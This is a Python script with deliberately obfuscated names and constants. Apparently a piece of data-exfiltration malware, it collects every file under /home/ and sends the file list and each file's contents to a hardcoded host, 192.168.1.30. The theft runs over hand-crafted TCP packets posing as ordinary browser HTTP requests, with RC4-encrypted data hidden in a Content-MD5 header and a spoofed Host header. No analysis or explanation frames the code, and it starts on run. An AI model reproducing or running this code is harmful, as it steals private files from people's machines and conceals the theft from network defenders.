import sys
import os
import time
import binascii
import random
import base64
from scapy.all import *


def dfqguvb8qz4cas9(k, d):
    eb3o0v9ie8 = 0o400
    dpw8ko0y3gi7h = []
    uajxoyu = list(range(eb3o0v9ie8))
    ozi4iqwms99xv = bdpw8ko0y3 = r589862eilxu = 0o0
    for pls in list(range(eb3o0v9ie8)):
        ozi4iqwms99xv = (
            ozi4iqwms99xv + uajxoyu[pls] + ord(k[pls % len(k)])) % eb3o0v9ie8
        uajxoyu[pls], uajxoyu[ozi4iqwms99xv] = uajxoyu[ozi4iqwms99xv], uajxoyu[pls]
    ozi4iqwms99xv = lq4vbnj2t = 0o0
    for xl4xr9hh in d:
        ozi4iqwms99xv = (ozi4iqwms99xv + 0o1) % eb3o0v9ie8
        lq4vbnj2t = (lq4vbnj2t + uajxoyu[ozi4iqwms99xv]) % eb3o0v9ie8
        uajxoyu[ozi4iqwms99xv], uajxoyu[lq4vbnj2t] = uajxoyu[lq4vbnj2t], uajxoyu[ozi4iqwms99xv]
        dpw8ko0y3gi7h.append(chr(ord(xl4xr9hh) ^ uajxoyu[(
            uajxoyu[ozi4iqwms99xv] + uajxoyu[lq4vbnj2t]) % eb3o0v9ie8]))
    return ''.join(dpw8ko0y3gi7h).encode().hex()


def ej6h13cyvp(zy102a):
    dmlidvl = []
    kpr2m8 = 0o0
    while True:
        ohno = 0o40
        dmlidvl.append(zy102a[kpr2m8:kpr2m8+ohno])
        kpr2m8 = kpr2m8 + ohno
        if kpr2m8 >= len(zy102a)-1:
            break
    return dmlidvl


def noraj():
    txkvoqw554hn = []
    for r, d, f in os.walk('/home/'):
        for file in f:
            txkvoqw554hn.append(os.path.join(r, file))
    return txkvoqw554hn


def req(syn_ack, lcyoa21, qu3jozz36o1):
    seq = syn_ack[TCP].ack
    ack = syn_ack[TCP].seq + 0o1
    for data in lcyoa21:
        g8uwxfy = base64.b64encode(dfqguvb8qz4cas9(
            str(ack), data).encode()).decode()
        key = str(random.randint(0o1750, 0o21450)).encode().hex()
        d = base64.b64encode(str(random.randint(0o16432451210000, 0o202757163310000)).encode(
        ).hex().encode()).decode().encode().hex()
        getStr = 'GET /panel.php?id={}&key={}&data={} HTTP/1.1\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nHost: www.gogole.com\r\nConnection: keep-alive\r\nContent-MD5: {}\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36\r\n\r\n'.format(
            qu3jozz36o1, key, d, g8uwxfy)
        reply = sr1(IP(dst=syn_ack[IP].src) / TCP(dport=syn_ack[TCP].sport,
                                                  sport=syn_ack[TCP].dport, seq=seq, ack=ack, flags='PA') / getStr, timeout=5)
        seq = reply[TCP].ack
        ack = len(reply[TCP].payload)
        if len(reply[TCP].payload) == 0o6:
            ack = reply[TCP].seq + 0o562
        elif len(reply[TCP].payload) != 0o562:
            ack = reply[TCP].seq + len(reply[TCP].payload) + 0o1
        else:
            ack = reply[TCP].seq + len(reply[TCP].payload)
        send(IP(dst=syn_ack[IP].src) / TCP(dport=syn_ack[TCP].sport,
                                           sport=reply[TCP].dport, seq=seq, ack=ack, flags='A'))
        time.sleep(0.1)
    return seq, ack


def send_it(hnij5s):
    qu3jozz36o1 = random.randint(0o1750, 0o21450)
    dip = '192.168.1.30'
    dport = 8080
    gg = [hnij5s[x:x+10] for x in range(0, len(hnij5s), 10)]
    for g in gg:
        seq = random.randrange(0, (2**32)-1)
        sport = random.randint(0o135422, 0o147256)
        syn = IP(dst=dip) / TCP(sport=sport, dport=dport, seq=seq, flags='S')
        last_req = sr1(syn, timeout=5)
        send(IP(dst=dip) / TCP(sport=sport, dport=dport,
                               seq=syn[TCP].seq + 0o1, ack=last_req[TCP].seq + 0o1, flags='A'))
        seq, ack = req(last_req, g, qu3jozz36o1)
        sr1(IP(dst=dip) / TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags='FA'))
        send(IP(dst=dip) / TCP(sport=sport, dport=dport,
                               seq=seq + 0o1, ack=ack + 0o1, flags='A'))
        time.sleep(1)
    return True


def obnco(xgyvjx7):
    a = '\n'.join(xgyvjx7)
    b = ej6h13cyvp(a.encode().hex())
    send_it(b)


def wnytyx(do7u6r1b):
    for fe in do7u6r1b:
        with open(fe, 'rb') as f:
            q = ej6h13cyvp(binascii.hexlify(f.read()).decode())
            send_it(q)
        f.closed


gb3ccd4n8kd = noraj()
obnco(gb3ccd4n8kd)
wnytyx(gb3ccd4n8kd)